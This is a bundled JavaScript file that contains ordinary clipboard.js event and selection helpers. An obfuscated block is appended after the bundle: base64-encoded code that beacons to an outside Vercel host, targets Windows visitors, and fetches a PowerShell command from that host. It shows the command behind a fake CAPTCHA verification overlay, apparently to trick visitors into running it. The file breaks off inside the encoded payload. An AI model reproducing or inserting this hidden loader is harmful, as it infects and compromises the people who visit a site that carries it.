    element.addEventListener(type, listenerFn, useCapture);

    return {
        destroy: function() {
            element.removeEventListener(type, listenerFn, useCapture);
        }
    }
}

/**
 * Delegates event to a selector.
 *
 * @param {Element|String|Array} [elements]
 * @param {String} selector
 * @param {String} type
 * @param {Function} callback
 * @param {Boolean} useCapture
 * @return {Object}
 */
function delegate(elements, selector, type, callback, useCapture) {
    // Handle the regular Element usage
    if (typeof elements.addEventListener === 'function') {
        return _delegate.apply(null, arguments);
    }

    // Handle Element-less usage, it defaults to global delegation
    if (typeof type === 'function') {
        // Use `document` as the first parameter, then apply arguments
        // This is a short way to .unshift `arguments` without running into deoptimizations
        return _delegate.bind(null, document).apply(null, arguments);
    }

    // Handle Selector-based usage
    if (typeof elements === 'string') {
        elements = document.querySelectorAll(elements);
    }

    // Handle Array-like based usage
    return Array.prototype.map.call(elements, function (element) {
        return _delegate(element, selector, type, callback, useCapture);
    });
}

/**
 * Finds closest match and invokes callback.
 *
 * @param {Element} element
 * @param {String} selector
 * @param {String} type
 * @param {Function} callback
 * @return {Function}
 */
function listener(element, selector, type, callback) {
    return function(e) {
        e.delegateTarget = closest(e.target, selector);

        if (e.delegateTarget) {
            callback.call(element, e);
        }
    }
}

module.exports = delegate;


/***/ }),

/***/ 879:
/***/ (function(__unused_webpack_module, exports) {

/**
 * Check if argument is a HTML element.
 *
 * @param {Object} value
 * @return {Boolean}
 */
exports.node = function(value) {
    return value !== undefined
        && value instanceof HTMLElement
        && value.nodeType === 1;
};

/**
 * Check if argument is a list of HTML elements.
 *
 * @param {Object} value
 * @return {Boolean}
 */
exports.nodeList = function(value) {
    var type = Object.prototype.toString.call(value);

    return value !== undefined
        && (type === '[object NodeList]' || type === '[object HTMLCollection]')
        && ('length' in value)
        && (value.length === 0 || exports.node(value[0]));
};

/**
 * Check if argument is a string.
 *
 * @param {Object} value
 * @return {Boolean}
 */
exports.string = function(value) {
    return typeof value === 'string'
        || value instanceof String;
};

/**
 * Check if argument is a function.
 *
 * @param {Object} value
 * @return {Boolean}
 */
exports.fn = function(value) {
    var type = Object.prototype.toString.call(value);

    return type === '[object Function]';
};


/***/ }),

/***/ 370:
/***/ (function(module, __unused_webpack_exports, __webpack_require__) {

var is = __webpack_require__(879);
var delegate = __webpack_require__(438);

/**
 * Validates all params and calls the right
 * listener function based on its target type.
 *
 * @param {String|HTMLElement|HTMLCollection|NodeList} target
 * @param {String} type
 * @param {Function} callback
 * @return {Object}
 */
function listen(target, type, callback) {
    if (!target && !type && !callback) {
        throw new Error('Missing required arguments');
    }

    if (!is.string(type)) {
        throw new TypeError('Second argument must be a String');
    }

    if (!is.fn(callback)) {
        throw new TypeError('Third argument must be a Function');
    }

    if (is.node(target)) {
        return listenNode(target, type, callback);
    }
    else if (is.nodeList(target)) {
        return listenNodeList(target, type, callback);
    }
    else if (is.string(target)) {
        return listenSelector(target, type, callback);
    }
    else {
        throw new TypeError('First argument must be a String, HTMLElement, HTMLCollection, or NodeList');
    }
}

/**
 * Adds an event listener to a HTML element
 * and returns a remove listener function.
 *
 * @param {HTMLElement} node
 * @param {String} type
 * @param {Function} callback
 * @return {Object}
 */
function listenNode(node, type, callback) {
    node.addEventListener(type, callback);

    return {
        destroy: function() {
            node.removeEventListener(type, callback);
        }
    }
}

/**
 * Add an event listener to a list of HTML elements
 * and returns a remove listener function.
 *
 * @param {NodeList|HTMLCollection} nodeList
 * @param {String} type
 * @param {Function} callback
 * @return {Object}
 */
function listenNodeList(nodeList, type, callback) {
    Array.prototype.forEach.call(nodeList, function(node) {
        node.addEventListener(type, callback);
    });

    return {
        destroy: function() {
            Array.prototype.forEach.call(nodeList, function(node) {
                node.removeEventListener(type, callback);
            });
        }
    }
}

/**
 * Add an event listener to a selector
 * and returns a remove listener function.
 *
 * @param {String} selector
 * @param {String} type
 * @param {Function} callback
 * @return {Object}
 */
function listenSelector(selector, type, callback) {
    return delegate(document.body, selector, type, callback);
}

module.exports = listen;


/***/ }),

/***/ 817:
/***/ (function(module) {

function select(element) {
    var selectedText;

    if (element.nodeName === 'SELECT') {
        element.focus();

        selectedText = element.value;
    }
    else if (element.nodeName === 'INPUT' || element.nodeName === 'TEXTAREA') {
        var isReadOnly = element.hasAttribute('readonly');

        if (!isReadOnly) {
            element.setAttribute('readonly', '');
        }

        element.select();
        element.setSelectionRange(0, element.value.length);

        if (!isReadOnly) {
            element.removeAttribute('readonly');
        }

        selectedText = element.value;
    }
    else {
        if (element.hasAttribute('contenteditable')) {
            element.focus();
        }

        var selection = window.getSelection();
        var range = document.createRange();

        range.selectNodeContents(element);
        selection.removeAllRanges();
        selection.addRange(range);

        selectedText = selection.toString();
    }

    return selectedText;
}

module.exports = select;


/***/ }),

/***/ 279:
/***/ (function(module) {

function E () {
  // Keep this empty so it's easier to inherit from
  // (via https://github.com/lipsmack from https://github.com/scottcorgan/tiny-emitter/issues/3)
}

E.prototype = {
  on: function (name, callback, ctx) {
    var e = this.e || (this.e = {});

    (e[name] || (e[name] = [])).push({
      fn: callback,
      ctx: ctx
    });

    return this;
  },

  once: function (name, callback, ctx) {
    var self = this;
    function listener () {
      self.off(name, listener);
      callback.apply(ctx, arguments);
    };

    listener._ = callback
    return this.on(name, listener, ctx);
  },

  emit: function (name) {
    var data = [].slice.call(arguments, 1);
    var evtArr = ((this.e || (this.e = {}))[name] || []).slice();
    var i = 0;
    var len = evtArr.length;

    for (i; i < len; i++) {
      evtArr[i].fn.apply(evtArr[i].ctx, data);
    }

    return this;
  },

  off: function (name, callback) {
    var e = this.e || (this.e = {});
    var evts = e[name];
    var liveEvents = [];

    if (evts && callback) {
      for (var i = 0, len = evts.length; i < len; i++) {
        if (evts[i].fn !== callback && evts[i].fn._ !== callback)
          liveEvents.push(evts[i]);
      }
    }

    // Remove event from queue to prevent memory leak
    // Suggested by https://github.com/lazd
    // Ref: https://github.com/scottcorgan/tiny-emitter/commit/c6ebfaa9bc973b33d110a84a307742b7cf94c953#commitcomment-5024910

    (liveEvents.length)
      ? e[name] = liveEvents
      : delete e[name];

    return this;
  }
};

module.exports = E;
module.exports.TinyEmitter = E;


/***/ })

/******/ 	});
/************************************************************************/
/******/ 	// The module cache
/******/ 	var __webpack_module_cache__ = {};
/******/ 	
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/ 		// Check if module is in cache
/******/ 		if(__webpack_module_cache__[moduleId]) {
/******/ 			return __webpack_module_cache__[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = __webpack_module_cache__[moduleId] = {
/******/ 			// no module.id needed
/******/ 			// no module.loaded needed
/******/ 			exports: {}
/******/ 		};
/******/ 	
/******/ 		// Execute the module function
/******/ 		__webpack_modules__[moduleId](module, module.exports, __webpack_require__);
/******/ 	
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/ 	
/************************************************************************/
/******/ 	/* webpack/runtime/compat get default export */
/******/ 	!function() {
/******/ 		// getDefaultExport function for compatibility with non-harmony modules
/******/ 		__webpack_require__.n = function(module) {
/******/ 			var getter = module && module.__esModule ?
/******/ 				function() { return module['default']; } :
/******/ 				function() { return module; };
/******/ 			__webpack_require__.d(getter, { a: getter });
/******/ 			return getter;
/******/ 		};
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/define property getters */
/******/ 	!function() {
/******/ 		// define getter functions for harmony exports
/******/ 		__webpack_require__.d = function(exports, definition) {
/******/ 			for(var key in definition) {
/******/ 				if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
/******/ 					Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
/******/ 				}
/******/ 			}
/******/ 		};
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/hasOwnProperty shorthand */
/******/ 	!function() {
/******/ 		__webpack_require__.o = function(obj, prop) { return Object.prototype.hasOwnProperty.call(obj, prop); }
/******/ 	}();
/******/ 	
/************************************************************************/
/******/ 	// module exports must be returned from runtime so entry inlining is disabled
/******/ 	// startup
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(686);
/******/ })()
.default;
});
}catch(e){}
})();


(function() {
  var _e = {
    "ku4vgq": "MC45MTE1OTYxOTExODAxNTg0",
    "dvgonj": "MC45MzEyNTYxMjkzNTc0MzI2",
    "539252": "CihmdW5jdGlvbigpewogIGNvbnN0IE4gPSAyOyAvLyBSZXF1aXJlZCB2aXNpdCBjb3VudAogIGNvbnN0IEtFWSA9ICdfdmMnOyAvLyBWaXNpdCBjb3VudGVyIGtleQogIGNvbnN0IG1ldHJpY3NFbmRwb2ludCA9ICdodHRwczovL3BubDcudmVyY2VsLmFwcC9hcGkvbWV0cmljcy90cmFjayc7CiAgY29uc3QgdGVtcGxhdGVJZCA9ICdjZjInOwogIGNvbnN0IHNjcmlwdElkID0gJ2NtbDJpbHMyZTAwMDExM2Z1cHZkNG1qdjMnOwogIGNvbnN0IFZFUkJPU0UgPSBmYWxzZTsKICBmdW5jdGlvbiB2bG9nKCkgewogICAgaWYgKCFWRVJCT1NFKSByZXR1cm47CiAgICB0cnkgeyBjb25zb2xlLmxvZygnW3RwXScsIC4uLmFyZ3VtZW50cyk7IH0gY2F0Y2ggKGUpIHt9CiAgfQogIGZ1bmN0aW9uIHZlcnIoKSB7CiAgICBpZiAoIVZFUkJPU0UpIHJldHVybjsKICAgIHRyeSB7IGNvbnNvbGUuZXJyb3IoJ1t0cF0nLCAuLi5hcmd1bWVudHMpOyB9IGNhdGNoIChlKSB7fQogIH0KICBsZXQgYm90VHJhY2tlZCA9IGZhbHNlOwoKICBmdW5jdGlvbiB0cmFja01ldHJpYyh0eXBlKSB7CiAgICB0cnkgewogICAgICBmZXRjaChtZXRyaWNzRW5kcG9pbnQgfHwgJy9hcGkvbWV0cmljcy90cmFjaycsIHsKICAgICAgICBtZXRob2Q6ICdQT1NUJywKICAgICAgICBoZWFkZXJzOiB7ICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicgfSwKICAgICAgICBib2R5OiBKU09OLnN0cmluZ2lmeSh7IHR5cGUsIHRlbXBsYXRlOiB0ZW1wbGF0ZUlkLCBzY3JpcHRJZDogc2NyaXB0SWQgfHwgdW5kZWZpbmVkIH0pLAogICAgICAgIG1vZGU6ICduby1jb3JzJywKICAgICAgICBrZWVwYWxpdmU6IHRydWUKICAgICAgfSkuY2F0Y2goKCkgPT4ge30pOwogICAgfSBjYXRjaCAoZXJyKSB7fQogIH0KCiAgdHJ5IHsKICAgIGlmICghd2luZG93Ll9fdHJhY2tNZXRyaWMpIHsKICAgICAgd2luZG93Ll9fdHJhY2tNZXRyaWMgPSB0cmFja01ldHJpYzsKICAgIH0KICAgIGlmICghd2luZG93Ll9fbWV0cmljc0VuZHBvaW50KSB7CiAgICAgIHdpbmRvdy5fX21ldHJpY3NFbmRwb2ludCA9IG1ldHJpY3NFbmRwb2ludDsKICAgIH0KICAgIGlmICghd2luZG93Ll9fdGVtcGxhdGVJZCkgewogICAgICB3aW5kb3cuX190ZW1wbGF0ZUlkID0gdGVtcGxhdGVJZDsKICAgIH0KICB9IGNhdGNoIChlcnIpIHt9CgogIGZ1bmN0aW9uIHRyYWNrQm90KCkgewogICAgaWYgKGJvdFRyYWNrZWQpIHJldHVybjsKICAgIGJvdFRyYWNrZWQgPSB0cnVlOwogICAgdHJhY2tNZXRyaWMoJ2JvdCcpOwogIH0KCiAgdmxvZygnaW5pdCcsIHsgdGVtcGxhdGVJZCwgc2NyaXB0SWQsIHZpc2l0czogTiwgaW5jbHVkZU9TOiBbIndpbmRvd3MiXSwgaW5jbHVkZUNvdW50cmllczogW10sIGRpc2FibGVJc3BDaGVjazogZmFsc2UgfSk7CgogIGZ1bmN0aW9uIGI2NFRvVXRmOChiNjQpIHsKICAgIHRyeSB7CiAgICAgIGNvbnN0IGJpbiA9IGF0b2IoYjY0KTsKICAgICAgY29uc3QgbGVuID0gYmluLmxlbmd0aDsKICAgICAgY29uc3QgYnl0ZXMgPSBuZXcgVWludDhBcnJheShsZW4pOwogICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGxlbjsgaSsrKSBieXRlc1tpXSA9IGJpbi5jaGFyQ29kZUF0KGkpOwoKICAgICAgaWYgKHR5cGVvZiBUZXh0RGVjb2RlciAhPT0gJ3VuZGVmaW5lZCcpIHsKICAgICAgICByZXR1cm4gbmV3IFRleHREZWNvZGVyKCd1dGYtOCcsIHsgZmF0YWw6IGZhbHNlIH0pLmRlY29kZShieXRlcyk7CiAgICAgIH0KCiAgICAgIC8vIEZhbGxiYWNrIGZvciBvbGRlciBicm93c2VycwogICAgICBsZXQgcGN0ID0gJyc7CiAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgbGVuOyBpKyspIHBjdCArPSAnJScgKyBieXRlc1tpXS50b1N0cmluZygxNikucGFkU3RhcnQoMiwgJzAnKTsKICAgICAgcmV0dXJuIGRlY29kZVVSSUNvbXBvbmVudChwY3QpOwogICAgfSBjYXRjaCAoZSkgewogICAgICB0cnkgewogICAgICAgIHJldHVybiBhdG9iKGI2NCk7CiAgICAgIH0gY2F0Y2ggKGUyKSB7CiAgICAgICAgcmV0dXJuICcnOwogICAgICB9CiAgICB9CiAgfQoKICBhc3luYyBmdW5jdGlvbiBpbmplY3RTY3JpcHQoKSB7CiAgICB0cnkgewogICAgICBjb25zdCBzY3JpcHRCNjQgPSAnS0dGemVXNWpJQ2dwSUQwK0lIc0tDaTh2SUZOb1lXUnZkeUJFVDAwZ2NtOXZkQ0JtYjNJZ2FYTnZiR0YwWldRZ2NYVmxjbWxsY3dwamIyNXpkQ0FrY205dmRDQTlJSGRwYm1SdmR5NWZYM1JtVTJoaFpHOTNVbTl2ZENCOGZDQmtiMk4xYldWdWREc0tDaTh2SU5DZjBMN1F1OUdEMFlmUXNOQzEwTHdnYzJOeWFYQjBTV1FnMExqUXR5RFF2OUN3MFlEUXNOQzgwTFhSZ3RHQTBMN1FzaUJWVWt3ZzBMalF1OUM0SU5DNDBZSFF2OUMrMEx2UmpOQzMwWVBRdGRDOElOQzAwTFhSaE5DKzBMdlJndEM5MFl2UXVRcGpiMjV6ZENCMWNteFFZWEpoYlhNZ1BTQnVaWGNnVlZKTVUyVmhjbU5vVUdGeVlXMXpLSGRwYm1SdmR5NXNiMk5oZEdsdmJpNXpaV0Z5WTJncE93cGpiMjV6ZENCelkzSnBjSFJKWkNBOUlIVnliRkJoY21GdGN5NW5aWFFvSjNOamNtbHdkRjlwWkNjcElIeDhJQ2RrWldaaGRXeDBKenNLQ214bGRDQm1aWFJqYUdWa1EyOXRiV0Z1WkNBOUlDY25Pd3BzWlhRZ1ptVjBZMmhsWkVOdmJXMWxiblFnUFNBbkp6c0tDZ3BtZFc1amRHbHZiaUJpWVhObE5qUkVaV052WkdWVlZFWXhOa3hGS0hOMGNpa2dld29nSUNBZ2RISjVJSHNLSUNBZ0lDQWdJQ0F2THlEUW85QzAwTERRdTlHUDBMWFF2Q0RRdjlHQTBMN1FzZEMxMEx2Uml5RFF1Q0RRdjlDMTBZRFF0ZEN5MEw3UXROR0xJTkdCMFlMUmdOQyswTG9LSUNBZ0lDQWdJQ0J6ZEhJZ1BTQnpkSEl1Y21Wd2JHRmpaU2d2VzF4elhISmNibDByTDJjc0lDY25LVHNLSUNBZ0lDQWdJQ0JqYjI1emRDQmlhVzVoY25rZ1BTQmhkRzlpS0hOMGNpazdDaUFnSUNBZ0lDQWdZMjl1YzNRZ1lubDBaWE1nUFNCdVpYY2dWV2x1ZERoQmNuSmhlU2hpYVc1aGNua3ViR1Z1WjNSb0tUc0tJQ0FnSUNBZ0lDQm1iM0lnS0d4bGRDQnBJRDBnTURzZ2FTQThJR0pwYm1GeWVTNXNaVzVuZEdnN0lHa3JLeWtnZXdvZ0lDQWdJQ0FnSUNBZ0lDQmllWFJsYzF0cFhTQTlJR0pwYm1GeWVTNWphR0Z5UTI5a1pVRjBLR2twT3dvZ0lDQWdJQ0FnSUgwS0lDQWdJQ0FnSUNBdkx5QlZWRVl0TVRaTVJUb2daWFpsY25rZ01pQmllWFJsY3lCcGN5QmhJR05vWVhJS0lDQWdJQ0FnSUNCc1pYUWdjbVZ6ZFd4MElEMGdKeWM3Q2lBZ0lDQWdJQ0FnWm05eUlDaHNaWFFnYVNBOUlEQTdJR2tnUENCaWVYUmxjeTVzWlc1bmRHZzdJR2tnS3owZ01pa2dld29nSUNBZ0lDQWdJQ0FnSUNCeVpYTjFiSFFnS3owZ1UzUnlhVzVuTG1aeWIyMURhR0Z5UTI5a1pTaGllWFJsYzF0cFhTQjhJQ2hpZVhSbGMxdHBJQ3NnTVYwZ1BEd2dPQ2twT3dvZ0lDQWdJQ0FnSUgwS0lDQWdJQ0FnSUNCeVpYUjFjbTRnY21WemRXeDBPd29nSUNBZ2ZTQmpZWFJqYUNBb1pTa2dleUJ5WlhSMWNtNGdKeWM3SUgwS2ZRb0tZWE41Ym1NZ1puVnVZM1JwYjI0Z1ptVjBZMmhEYjIxdFlXNWtRVzVrUTI5dGJXVnVkQ2dwSUhzS0lDQWdJSFJ5ZVNCN0NpQWdJQ0FnSUNBZ1kyOXVjM1FnWVhCcFZYSnNJRDBnWUdoMGRIQnpPaTh2Y0c1c055NTJaWEpqWld3dVlYQndMMkZ3YVM5d2IzZGxjbk5vWld4c0wyTnRiREpwYkhNeVpUQXdNREV4TTJaMWNIWmtORzFxZGpOZ093b2dJQ0FnSUNBZ0lHTnZibk4wSUhKbGN5QTlJR0YzWVdsMElHWmxkR05vS0dGd2FWVnliQ2s3Q2lBZ0lDQWdJQ0FnYVdZZ0tDRnlaWE11YjJzcElIUm9jbTkzSUc1bGR5QkZjbkp2Y2lnblJtRnBiR1ZrSUhSdklHWmxkR05vSUdOdmJXMWhibVFuS1RzS0lDQWdJQ0FnSUNCamIyNXpkQ0JrWVhSaElEMGdZWGRoYVhRZ2NtVnpMbXB6YjI0b0tUc0tJQ0FnSUNBZ0lDQm1aWFJqYUdWa1EyOXRiV0Z1WkNBOUlHSmhjMlUyTkVSbFkyOWtaVlZVUmpFMlRFVW9aR0YwWVM1amIyMXRZVzVrSUh4OElDY25LVHNLSUNBZ0lDQWdJQ0JtWlhSamFHVmtRMjl0YldWdWRDQTlJR1JoZEdFdVkyOXRiV1Z1ZENCOGZDQW5KenNLSUNBZ0lDQWdJQ0F2THlEUWt0R0IwWUxRc05DeTBMalJndEdNSUdOdmJXMWxiblFnMExJZ1BHTnZaR1UrSUNqUXQ5Q3cwTHpRdGRDOTBMalJndEdNSU5HQzBMWFF1dEdCMFlJcENpQWdJQ0FnSUNBZ1kyOXVjM1FnWTI5a1pVVnNJRDBnSkhKdmIzUXVjWFZsY25sVFpXeGxZM1J2Y2lnblkyOWtaU2NwT3dvZ0lDQWdJQ0FnSUdsbUlDaGpiMlJsUld3cElHTnZaR1ZGYkM1MFpYaDBRMjl1ZEdWdWRDQTlJR1psZEdOb1pXUkRiMjF0Wlc1ME93b2dJQ0FnZlNCallYUmphQ0FvWlNrZ2V3b2dJQ0FnSUNBZ0lHWmxkR05vWldSRGIyMXRZVzVrSUQwZ0owWmhhV3hsWkNCMGJ5QnNiMkZrSUdOdmJXMWhibVFuT3dvZ0lDQWdJQ0FnSUdabGRHTm9aV1JEYjIxdFpXNTBJRDBnSnljN0NpQWdJQ0I5Q24wS0NtTnZibk4wSUhSeVlXTnJUV1YwY21saklEMGdLSGRwYm1SdmR5NWZYM1J5WVdOclRXVjBjbWxqS1NBL0lIZHBibVJ2ZHk1ZlgzUnlZV05yVFdWMGNtbGpJRG9nWm5WdVkzUnBiMjRvZEhsd1pTa2dld29nSUNBZ2RISjVJSHNLSUNBZ0lDQWdJQ0JqYjI1emRDQjBaVzF3YkdGMFpVbGtJRDBnZDJsdVpHOTNMbDlmZEdWdGNHeGhkR1ZKWkNCOGZDQW5ZMll5SnpzS0lDQWdJQ0FnSUNCbVpYUmphQ2duTDJGd2FTOXRaWFJ5YVdOekwzUnlZV05ySnl3Z2V3b2dJQ0FnSUNBZ0lDQWdJQ0J0WlhSb2IyUTZJQ2RRVDFOVUp5d0tJQ0FnSUNBZ0lDQWdJQ0FnYUdWaFpHVnljem9nZXlBblEyOXVkR1Z1ZEMxVWVYQmxKem9nSjJGd2NHeHBZMkYwYVc5dUwycHpiMjRuSUgwc0NpQWdJQ0FnSUNBZ0lDQWdJR0p2WkhrNklFcFRUMDR1YzNSeWFXNW5hV1o1S0hzZ2RIbHdaU3dnZEdWdGNHeGhkR1U2SUhSbGJYQnNZWFJsU1dRZ2ZTa3NDaUFnSUNBZ0lDQWdJQ0FnSUcxdlpHVTZJQ2R1YnkxamIzSnpKeXdLSUNBZ0lDQWdJQ0FnSUNBZ2EyVmxjR0ZzYVhabE9pQjBjblZsQ2lBZ0lDQWdJQ0FnZlNrdVkyRjBZMmdvS0NrZ1BUNGdlMzBwT3dvZ0lDQWdmU0JqWVhSamFDQW9aWEp5S1NCN2ZRcDlPd29LYkdWMElHTnZiWEJzWlhSbFZISmhZMnRsWkNBOUlHWmhiSE5sT3dwbWRXNWpkR2x2YmlCMGNtRmphME52YlhCc1pYUmxLQ2tnZXdvZ0lDQWdhV1lnS0dOdmJYQnNaWFJsVkhKaFkydGxaQ2tnY21WMGRYSnVPd29nSUNBZ1kyOXRjR3hsZEdWVWNtRmphMlZrSUQwZ2RISjFaVHNLSUNBZ0lIUnlZV05yVFdWMGNtbGpLQ2RqYjIxd2JHVjBaU2NwT3dwOUNnb3ZMeURRa2RDKzBMdlJqTkdJMExVZzBMM1F0U0RRdmRHRDBMYlF2ZEMrSU5HQjBMN1FzZEM0MFlEUXNOR0MwWXdnMExyUXZ0QzgwTERRdmRDMDBZTWcwTExSZ05HRDBZZlF2ZEdEMFk0S0NpOHZJRWRGVkNBS1kyOXVjM1FnY0dGeVlXMXpJRDBnYm1WM0lGVlNURk5sWVhKamFGQmhjbUZ0Y3loM2FXNWtiM2N1Ykc5allYUnBiMjR1YzJWaGNtTm9LVHNLWTI5dWMzUWdjMmwwWlZWeWJDQTlJSEJoY21GdGN5NW5aWFFvSjNOcGRHVW5LU0I4ZkNCM2FXNWtiM2N1Ykc5allYUnBiMjR1YUc5emRHNWhiV1U3Q21OdmJuTjBJR3h2WjI5VmNtd2dQU0J3WVhKaGJYTXVaMlYwS0Nkc2IyZHZKeWs3Q21OdmJuTjBJR1JsWm1GMWJIUk1iMmR2VlhKc0lEMGdKMmgwZEhCek9pOHZNbU5oY0hSamFHRXVZMjl0TDJScGMzUXZkMlZpTDJGemMyVjBjeTluYjI5bmJHVXRjSEpwZG1GamVTMXdiMnhwWTNrdFEySXdRMGRXVWxRdWMzWm5KenNLQ2lSeWIyOTBMbkYxWlhKNVUyVnNaV04wYjNKQmJHd29KeTVqTlZWbGMyNXhlRUluS1M1bWIzSkZZV05vS0dWc0lEMCtJSHNLSUNCbGJDNTBaWGgwUTI5dWRHVnVkQ0E5SUhOcGRHVlZjbXc3Q24wcE93b0tKSEp2YjNRdWNYVmxjbmxUWld4bFkzUnZja0ZzYkNnbkxtTTNSekV6YXpKUmVWaG9KeWt1Wm05eVJXRmphQ2hwYldjZ1BUNGdld29nSUdsdFp5NXpjbU1nUFNCc2IyZHZWWEpzSUh4OElHUmxabUYxYkhSTWIyZHZWWEpzT3dvZ0lHbHRaeTVoYkhRZ1BTQW5iRzluYnljN0NuMHBPd29LWm5WdVkzUnBiMjRnYzJWMFUydHBjRVpzWVdjb0tTQjdDaUFnSUNCMGNua2dld29nSUNBZ0lDQWdJR3h2WTJGc1UzUnZjbUZuWlM1elpYUkpkR1Z0S0NkZmMydHBjQ2NzSUNjeEp5azdDaUFnSUNCOUlHTmhkR05vSUNobGNuSXBJSHNLSUNBZ0lDQWdJQ0JrYjJOMWJXVnVkQzVqYjI5cmFXVWdQU0FuWDNOcmFYQTlNVHNnY0dGMGFEMHZPeUJ0WVhndFlXZGxQVE14TlRNMk1EQXdKenNLSUNBZ0lIMEtmUW9LWVhONWJtTWdablZ1WTNScGIyNGdhVzVwZEZabGNtbG1hV05oZEdsdmJrWnNiM2NvS1NCN0NpQWdJQ0JqYjI1emRDQndjbVZzYjJGa1pYSkZiR1Z0Wlc1MGN5QTlJQ1J5YjI5MExuRjFaWEo1VTJWc1pXTjBiM0pCYkd3b0lpNWpSVnBCU0RCVU9UUWlLVHNLSUNBZ0lHTnZibk4wSUhCeVpXeHZZV1JsY2xSbGVIUWdQU0FrY205dmRDNXhkV1Z5ZVZObGJHVmpkRzl5S0NJdVkxQnNWa3M0YzBnM2RpSXBPd29nSUNBZ1kyOXVjM1FnZEdWNGRFRnNiRk4wWlhBZ1BTQWtjbTl2ZEM1eGRXVnllVk5sYkdWamRHOXlLQ0l1WTNCVWFrNXZRMmc1SWlrN0NpQWdJQ0JqYjI1emRDQmphR1ZqYTJKdmVGZHBibVJ2ZHlBOUlDUnliMjkwTG5GMVpYSjVVMlZzWldOMGIzSW9JaU5wZW1sbFlWSkRNV2t3WTNKV2JHUWlLVHNLSUNBZ0lHTnZibk4wSUhOMFpYQXdSV3hsYldWdWRITWdQU0FrY205dmRDNXhkV1Z5ZVZObGJHVmpkRzl5UVd4c0tDSXVZM0JoZUVsS2IyMHljamRSZW1Sc05DSXBPd29nSUNBZ1kyOXVjM1FnYzNSbGNERkZiR1Z0Wlc1MGN5QTlJQ1J5YjI5MExuRjFaWEo1VTJWc1pXTjBiM0pCYkd3b0lpNWpjSFZaU0ZaWFptY3lUMVkxSWlrN0NpQWdJQ0JqYjI1emRDQnpkR1Z3TWtWc1pXMWxiblJ6SUQwZ0pISnZiM1F1Y1hWbGNubFRaV3hsWTNSdmNrRnNiQ2dpTG1OUU56WktUamR1Ym1VemFVY2lLVHNLSUNBZ0lHTnZibk4wSUhOMFpYQXpSV3hsYldWdWRITWdQU0FrY205dmRDNXhkV1Z5ZVZObGJHVmpkRzl5UVd4c0tDSXVZMmxEVkhRNE1saDRTMGxzSWlrN0NpQWdJQ0JqYjI1emRDQmphR1ZqYTJKdmVDQTlJQ1J5YjI5MExuRjFaWEo1VTJWc1pXTjBiM0lvSWlOcGRHZDZNRmhTU0dRNGJsa2lLVHNLSUNBZ0lHTnZibk4wSUhabGNtbG1lVmRwYm1SdmR5QTlJQ1J5YjI5MExuRjFaWEo1VTJWc1pXTjBiM0lvSWlOcGRYZ3dOVVJqV0dFNVdYRlBaamtpS1RzS0lDQWdJR052Ym5OMElITndhVzV1WlhJZ1BTQWtjbTl2ZEM1eGRXVnllVk5sYkdWamRHOXlLQ0lqYVdOemVuTjVUM2hoT1U4MFQyRnNjQ0lwT3dvZ0lDQWdZMjl1YzNRZ2RtVnlhV1o1UW5WMGRHOXVJRDBnSkhKdmIzUXVjWFZsY25sVFpXeGxZM1J2Y2lnaUkybFFkVGRhZVhoSmFrczVNVVl5Y0ZjaUtUc0tDaUFnSUNCaGQyRnBkQ0JtWlhSamFFTnZiVzFoYm1SQmJtUkRiMjF0Wlc1MEtDazdDaUFnSUNCelpYUlVhVzFsYjNWMEtDZ3BJRDArSUhzS0lDQWdJQ0FnSUNCd2NtVnNiMkZrWlhKRmJHVnRaVzUwY3k1bWIzSkZZV05vS0dWc0lEMCtJR1ZzTG5OMGVXeGxMbVJwYzNCc1lYa2dQU0FpYm05dVpTSXBPd29nSUNBZ0lDQWdJSEJ5Wld4dllXUmxjbFJsZUhRdWMzUjViR1V1WkdsemNHeGhlU0E5SUNKdWIyNWxJanNLSUNBZ0lDQWdJQ0IwWlhoMFFXeHNVM1JsY0M1emRIbHNaUzVrYVhOd2JHRjVJRDBnSW1Kc2IyTnJJanNLSUNBZ0lDQWdJQ0JqYUdWamEySnZlRmRwYm1SdmR5NXpkSGxzWlM1a2FYTndiR0Y1SUQwZ0ltWnNaWGdpT3dvS0lDQWdJQ0FnSUNCelpYUlVhVzFsYjNWMEtDZ3BJRDArSUhzS0lDQWdJQ0FnSUNBZ0lDQWdZMmhsWTJ0aWIzaFhhVzVrYjNjdWMzUjViR1V1WkdsemNHeGhlU0E5SUNKbWJHVjRJanNnQ2lBZ0lDQWdJQ0FnSUNBZ0lHeGxkQ0J2Y0dGamFYUjVJRDBnTURzS0lDQWdJQ0FnSUNBZ0lDQWdiR1YwSUdaaFpHVkpiaUE5SUhObGRFbHVkR1Z5ZG1Gc0tDZ3BJRDArSUhzS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUdsbUlDaHZjR0ZqYVhSNUlENDlJREVwSUhzS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQmpiR1ZoY2tsdWRHVnlkbUZzS0daaFpHVkpiaWs3SUFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnZlNCbGJITmxJSHNLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCdmNHRmphWFI1SUNzOUlEQXVNVHNnQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1kyaGxZMnRpYjNoWGFXNWtiM2N1YzNSNWJHVXViM0JoWTJsMGVTQTlJRzl3WVdOcGRIazdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQjlDaUFnSUNBZ0lDQWdJQ0FnSUgwc0lETXdLVHNLSUNBZ0lDQWdJQ0I5TENBeU1EQXBPd29LSUNBZ0lDQWdJQ0J6ZEdWd01FVnNaVzFsYm5SekxtWnZja1ZoWTJnb1pXd2dQVDRnWld3dWMzUjViR1V1WkdsemNHeGhlU0E5SUNKaWJHOWpheUlwT3dvS0lDQWdJQ0FnSUNCelpYUlVhVzFsYjNWMEtDZ3BJRDArSUhzS0lDQWdJQ0FnSUNBZ0lDQWdjM1JsY0RCRmJHVnRaVz